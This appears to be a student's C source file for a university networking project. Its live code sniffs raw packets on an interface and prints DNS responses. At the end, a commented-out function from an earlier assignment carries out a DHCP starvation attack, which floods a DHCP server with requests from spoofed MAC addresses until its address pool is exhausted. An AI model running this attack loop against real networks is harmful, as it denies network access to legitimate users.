// main.c
// IPK-PROJ2, 03.04.2018
// ISA, 30.09.2018
// Author: Daniel Dolejska, FIT

#define DEBUG_PRINT_ENABLED
#define DEBUG_LOG_ENABLED
#define DEBUG_ERR_ENABLED

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <sys/time.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include "network.h"
#include "macros.h"
#include "dns.h"

#define DNS_PORT 53

#ifndef BUFFER_SIZE
#define BUFFER_SIZE 1500 // send and receive buffer size in bits
#endif

/**
 *
 * @param sock
 * @param data
 *
 * @return
 */
ssize_t receive_data( int sock, uint8_t *data )
{
	ssize_t recv_bits = 0;
	memset(data, 0, BUFFER_SIZE);

	//  Receive offer
	recv_bits = recvfrom(sock, data, BUFFER_SIZE, 0, NULL, NULL);
	if (errno == EAGAIN || errno == EWOULDBLOCK)
	{
		//  Receive timeout
		DEBUG_LOG("THREAD", "Response read timed out...");
		//DEBUG_PRINT("\ttimed out after: %ds\n", SOCKET_TIMEOUT);

		/*
		if (retry_times < SOCKET_RETRY_COUNT)
		{
			DEBUG_LOG("THREAD", "Retrying...");
			retry_times++;
			send_request = 1;
			DEBUG_PRINT("\ttry #%d\n", retry_times);
			continue;
		}
		else
		{
			DEBUG_LOG("THREAD", "Tried too many times with no reply. Exiting.");
			DEBUG_PRINT("\ttry count %d\n", SOCKET_RETRY_COUNT);
			timed_out = 1;
			break;
		}
		*/
	}
	else if (recv_bits < 0 || errno != 0)
	{
		//  Different error
		perror("recvfrom");
		//timed_out = 1;
	}

	return recv_bits;
}

/**
 *
 * @param interface
 */
void start_interface_listening( char *interface )
{
	DEBUG_LOG("PROCESS", "Starting listening...");

	DEBUG_LOG("PROCESS", "Creating RAW socket...");
	int sock;
	//  Raw socket
	if ((sock = socket(AF_PACKET, SOCK_RAW, htons(0x0800))) == -1)
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}

	DEBUG_LOG("PROCESS", "Getting interface ID...");
	struct ifreq if_idx;
	memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, interface, strlen(interface) + 1);
	if (ioctl(sock, SIOCGIFINDEX, &if_idx) < 0)
	{
		perror("SIOCGIFINDEX");
		exit(EXIT_FAILURE);
	}

	DEBUG_LOG("PROCESS", "Setting socket options...");
	if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, interface, strlen(interface) + 1) == -1)
	{
		perror("SO_BINDTODEVICE");
		close(sock);
		exit(EXIT_FAILURE);
	}

	int flag = 1;
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag)) == -1)
	{
		perror("SO_REUSEADDR");
		close(sock);
		exit(EXIT_FAILURE);
	}

	/*
	DEBUG_LOG("PROCESS", "Creating socket destination address...");
	//  Destination address
	struct sockaddr_ll socket_dst;
	//  Index of the network device
	socket_dst.sll_ifindex = if_idx.ifr_ifindex;
	//  Address length
	socket_dst.sll_halen = ETH_ALEN;
	//  Destination MAC (broadcast)
	socket_dst.sll_addr[0] = 0xFF;
	socket_dst.sll_addr[1] = 0xFF;
	socket_dst.sll_addr[2] = 0xFF;
	socket_dst.sll_addr[3] = 0xFF;
	socket_dst.sll_addr[4] = 0xFF;
	socket_dst.sll_addr[5] = 0xFF;*/

    DEBUG_LOG("PROCESS", "Listening for transmissions...");
	while (1)
	{
		static ssize_t recv_bits = 0;
		uint8_t recv_data[BUFFER_SIZE] = {};
		recv_bits = receive_data(sock, recv_data);

        DEBUG_LOG("PROCESS", "Packet received...");

        UDPPacketPtr packet = parse_udp_packet(recv_data);
        if (packet->udp_header->source == DNS_PORT)
		{
			DEBUG_LOG("PROCESS", "Packet destination: DNS PORT...");
			DEBUG_PRINT("packet_size: %ld\n", recv_bits);


			DNSPacketPtr dns = parse_dns_packet(packet);

			print_dns_packet(dns);

			destroy_dns_packet(dns);
		}

        destroy_udp_packet(packet);
		if (recv_bits < 0)
		    break;
	}
}

/**
 * Main program function.
 *
 * @param argc
 * @param argv
 *
 * @return
 */
int main(int argc, char **argv)
{
	DEBUG_LOG("MAIN", "Starting application...");
	//  inicializace

	DEBUG_LOG("MAIN", "Processing options...");
	//  zpracování přepínačů

	/* Spuštění aplikace
	dns-export [-r file.pcap] [-i interface] [-s syslog-server] [-t seconds]

	-r : zpracuje daný pcap soubor
	-i : naslouchá na daném síťovém rozhraní a zpracovává DNS provoz
	-s : hostname/ipv4/ipv6 adresa syslog serveru
	-t : doba výpočtu statistik, výchozí hodnota 60s
	 */

	/*
	if (argc != 3 || argv[1][0] != '-' || argv[1][1] != 'i' || strcmp(argv[2], "") == 0)
	{
		ERR("Invalid options specified.\nUsage: %s -i <interface>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	char *interface = argv[2];
	 */
	//char *interface = "enp0s3";
	char *interface = "eth0";
	DEBUG_PRINT("\tinterface: '%s'\n", interface);

	start_interface_listening(interface);

	DEBUG_LOG("MAIN", "Exiting program...");

	exit(EXIT_SUCCESS);
}


/*
void *begin_dhcp_starvation( void *interface_arg )
{
	DEBUG_LOG("THREAD", "Starting DHCP starvation...");

	char *interface = (char *)interface_arg;

	DEBUG_LOG("THREAD", "Creating RAW socket...");
	int sock;
	//  Raw socket
	if ((sock = socket(AF_PACKET, SOCK_RAW, htons(0x0800))) == -1)
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}


	DEBUG_LOG("THREAD", "Getting interface ID...");
	struct ifreq if_idx;
	memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, interface, strlen(interface) + 1);
	if (ioctl(sock, SIOCGIFINDEX, &if_idx) < 0)
	{
		perror("SIOCGIFINDEX");
		exit(EXIT_FAILURE);
	}

	DEBUG_LOG("THREAD", "Setting socket options...");
	if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, interface, strlen(interface) + 1) == -1)
	{
		perror("SO_BINDTODEVICE");
		close(sock);
		exit(EXIT_FAILURE);
	}

	int flag = 1;
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag)) == -1)
	{
		perror("SO_REUSEADDR");
		close(sock);
		exit(EXIT_FAILURE);
	}

	struct timeval timeout;
	timeout.tv_sec = 2000; // SOCKET_TIMEOUT

	if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(struct timeval)) == -1)
	{
		perror("SO_RCVTIMEO");
		close(sock);
		exit(EXIT_FAILURE);
	}

	DEBUG_LOG("THREAD", "Creating socket destination address...");
	//  Destination address
	struct sockaddr_ll socket_address;
	//  Index of the network device
	socket_address.sll_ifindex = if_idx.ifr_ifindex;
	//  Address length
	socket_address.sll_halen = ETH_ALEN;
	//  Destination MAC (broadcast)
	socket_address.sll_addr[0] = 0xFF;
	socket_address.sll_addr[1] = 0xFF;
	socket_address.sll_addr[2] = 0xFF;
	socket_address.sll_addr[3] = 0xFF;
	socket_address.sll_addr[4] = 0xFF;
	socket_address.sll_addr[5] = 0xFF;

	int timed_out = 0;

	while (1)
	{
		DEBUG_LOG("THREAD", "Generating new MAC address...");
		uint8_t *mac = create_mac();
		DEBUG_PRINT("Created: %#x\n", (uint32_t) mac);
		DEBUG_PRINT("Created: %x:%x:%x:%x:%x:%x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

		uint16_t data_len = 0;
		uint8_t data[BUFFER_SIZE];
		memset(data, 0, BUFFER_SIZE);

		DEBUG_LOG("THREAD", "Creating DHCPDISCOVER packet...");
		dhcp_request_create(data, &data_len, mac, DHCPDISCOVER, NULL, 0);

		DEBUG_LOG("THREAD", "Finalizing DHCPDISCOVER packet...");
		dhcp_request_complete(data, &data_len);

		DEBUG_LOG("THREAD", "Printing before sending...");
		print_ip_header(get_ip_header(data));
		print_udp_header(get_udp_header(data));

		int recv_bits = 0;
		uint8_t recv_data[BUFFER_SIZE];
		memset(recv_data, 0, BUFFER_SIZE);

		int retry_times = 0;
		int send_request = 1;

		struct timeval started_at;
		timer_reset(&started_at);

		while (1)
		{
			if (timer_elapsed(&started_at) > OPERATION_TIMEOUT)
			{
				DEBUG_LOG("THREAD", "DHCPOFFER: Operation timed out. Exiting.");
				DEBUG_PRINT("\ttimed out after: %dms (had %dms)\n", timer_elapsed(&started_at), OPERATION_TIMEOUT);
				timed_out = 1;
				break;
			}
			DEBUG_PRINT("\toperation time elapsed: %dms\n", timer_elapsed(&started_at));

			if (send_request)
			{
				DEBUG_LOG("THREAD", "Sending DHCPDISCOVER packet...");

				//  Send packet
				sendto(sock, data, data_len, 0, (struct sockaddr *) &socket_address, sizeof(struct sockaddr_ll));
				if (errno != 0)
				{
					perror("DHCPDISCOVER sendto");
					timed_out = 1;
					break;
				}

				send_request = 0;
			}

			DEBUG_LOG("THREAD", "Waiting for response (DHCPOFFER)...");

			//  Receive offer
			recv_bits = recvfrom(sock, recv_data, BUFFER_SIZE, 0, NULL, NULL);
			if (errno == EAGAIN || errno == EWOULDBLOCK)
			{
				//  Receive timeout
				DEBUG_LOG("THREAD", "Response read timed out...");
				DEBUG_PRINT("\ttimed out after: %ds\n", SOCKET_TIMEOUT);
				if (retry_times < SOCKET_RETRY_COUNT)
				{
					DEBUG_LOG("THREAD", "Retrying...");
					retry_times++;
					send_request = 1;
					DEBUG_PRINT("\ttry #%d\n", retry_times);
					continue;
				}
				else
				{
					DEBUG_LOG("THREAD", "Tried too many times with no reply. Exiting.");
					DEBUG_PRINT("\ttry count %d\n", SOCKET_RETRY_COUNT);
					timed_out = 1;
					break;
				}
			}
			else if (errno != 0)
			{
				//  Different error
				perror("recvfrom");
				timed_out = 1;
				break;
			}
			else if (recv_bits < 0)
			{
				perror("recvfrom");
				timed_out = 1;
				break;
			}

			DEBUG_LOG("THREAD", "Data received...");
			DEBUG_PRINT("\treceived: %d\n", recv_bits);
			if (get_ip_header(recv_data)->saddr == 0)
			{
				DEBUG_LOG("THREAD", "Ignoring packet with no source IP address...");
				continue;
			}

			print_eth_header(get_eth_header(recv_data));
			print_ip_header(get_ip_header(recv_data));
			print_udp_header(get_udp_header(recv_data));
			print_dhcp_data(get_dhcp_data(recv_data));

			//if (dhcp_request_receive(recv_data, (uint16_t) recv_bits, data, data_len, BOOTREPLY, DHCPOFFER) == 0)
            if (dhcp_request_receive(recv_data, (uint16_t) recv_bits, data, BOOTREPLY, DHCPOFFER) == 0)
			{
				DEBUG_LOG("THREAD", "Not valid DHCPOFFER packet...");
				if ((int)(timer_elapsed(&started_at) / 1000 / SOCKET_TIMEOUT) > retry_times && retry_times < SOCKET_RETRY_COUNT)
				{
					//  Data jsme sice dostali, ale nejednalo se o data, ktera jsme chteli
					//  Cas presahl cas SOCKET_TIMEOUT, pokusime se o znovuodeslani predchazejici zadosti
					DEBUG_LOG("THREAD", "Socket wait time exceeded, retrying to send previous request...");
					retry_times++;
					send_request = 1;
					DEBUG_PRINT("\ttry #%d\n", retry_times);
				}
				continue;
			}

			DEBUG_LOG("THREAD", "IP offered! Accepting offer!");
			DEBUG_PRINT("\t%hu.%hu.%hu.%hu\n",
						get_dhcp_data(recv_data)->yiaddr << 24 >> 24,
						get_dhcp_data(recv_data)->yiaddr << 16 >> 24,
						get_dhcp_data(recv_data)->yiaddr << 8  >> 24,
						get_dhcp_data(recv_data)->yiaddr       >> 24);

			DEBUG_LOG("THREAD", "Creating DHCPREQUEST packet...");
			memset(data, 0, BUFFER_SIZE);
			data_len = 0;
			dhcp_request_create(data, &data_len, mac, DHCPREQUEST, recv_data, (uint16_t) recv_bits);

			DEBUG_LOG("THREAD", "Finalizing DHCPREQUEST packet...");
			dhcp_request_complete(data, &data_len);

			retry_times = 0;
			send_request = 1;
			timer_reset(&started_at);

			while (1)
			{
				if (timer_elapsed(&started_at) > OPERATION_TIMEOUT)
				{
					DEBUG_LOG("THREAD", "DHCPACK: Operation timed out. Exiting.");
					DEBUG_PRINT("\ttimed out after: %dms (had %dms)\n", timer_elapsed(&started_at), OPERATION_TIMEOUT);
					timed_out = 1;
					break;
				}

				if (send_request)
				{
					DEBUG_LOG("THREAD", "Sending DHCPREQUEST packet...");

					//  Send packet
					sendto(sock, data, data_len, 0, (struct sockaddr *) &socket_address, sizeof(struct sockaddr_ll));
					if (errno != 0)
					{
						perror(" DHCPREQUESTsendto");
						timed_out = 1;
						break;
					}

					send_request = 0;
				}

				DEBUG_LOG("THREAD", "Waiting for response (DHCPACK)...");

				//  Receive offer
				recv_bits = recvfrom(sock, recv_data, BUFFER_SIZE, 0, NULL, NULL);
				if (errno == EAGAIN || errno == EWOULDBLOCK)
				{
					//  Receive timeout
					DEBUG_LOG("THREAD", "Response read timed out...");
					DEBUG_PRINT("\ttimed out after: %ds\n", SOCKET_TIMEOUT);
					if (retry_times < SOCKET_RETRY_COUNT)
					{
						DEBUG_LOG("THREAD", "Retrying...");
						retry_times++;
						send_request = 1;
						DEBUG_PRINT("\ttry #%d\n", retry_times);
						continue;
					}
					else
					{
						DEBUG_LOG("THREAD", "Tried too many times with no reply. Exiting.");
						DEBUG_PRINT("\ttry count %d\n", SOCKET_RETRY_COUNT);
						timed_out = 1;
						break;
					}
				}
				else if (errno != 0)
				{
					//  Different error
					perror("recvfrom");
					timed_out = 1;
					break;
				}
				else if (recv_bits < 0)
				{
					perror("recvfrom");
					timed_out = 1;
					break;
				}

				DEBUG_LOG("THREAD", "Data received...");
				DEBUG_PRINT("\treceived: %d\n", recv_bits);
				if (get_ip_header(recv_data)->saddr == 0)
				{
					DEBUG_LOG("THREAD", "Ignoring packet with no source IP address...");
					continue;
				}

				print_eth_header(get_eth_header(recv_data));
				print_ip_header(get_ip_header(recv_data));
				print_udp_header(get_udp_header(recv_data));
				print_dhcp_data(get_dhcp_data(recv_data));

				//if (dhcp_request_receive(recv_data, (uint16_t) recv_bits, data, data_len, BOOTREPLY, DHCPACK) == 0)
                if (dhcp_request_receive(recv_data, (uint16_t) recv_bits, data, BOOTREPLY, DHCPACK) == 0)
				{
					DEBUG_LOG("THREAD", "Not valid DHCPACK packet...");
					if ((int)(timer_elapsed(&started_at) / 1000 / SOCKET_TIMEOUT) > retry_times && retry_times < SOCKET_RETRY_COUNT)
					{
						//  Data jsme sice dostali, ale nejednalo se o data, ktera jsme chteli
						//  Cas presahl cas SOCKET_TIMEOUT, pokusime se o znovuodeslani predchazejici zadosti
						DEBUG_LOG("THREAD", "Socket wait time exceeded, retrying to send previous request...");
						retry_times++;
						send_request = 1;
						DEBUG_PRINT("\ttry #%d\n", retry_times);
					}
					continue;
				}

				OUTPUT("%hu.%hu.%hu.%hu\n",
					   get_dhcp_data(recv_data)->yiaddr << 24 >> 24,
					   get_dhcp_data(recv_data)->yiaddr << 16 >> 24,
					   get_dhcp_data(recv_data)->yiaddr << 8  >> 24,
					   get_dhcp_data(recv_data)->yiaddr       >> 24);
				break;
			}

			break;
		}

		destroy_mac(mac);

		if (timed_out)
		{
			DEBUG_LOG("THREAD", "Stopping DHCP starvation...");
			break;
		}

		DEBUG_LOG("THREAD", "Continuing in starvation...");
	}

	DEBUG_LOG("THREAD", "Preparing to exit thread...");

	close(sock);

	DEBUG_LOG("THREAD", "Exiting thread...");

	return NULL;
}
 */
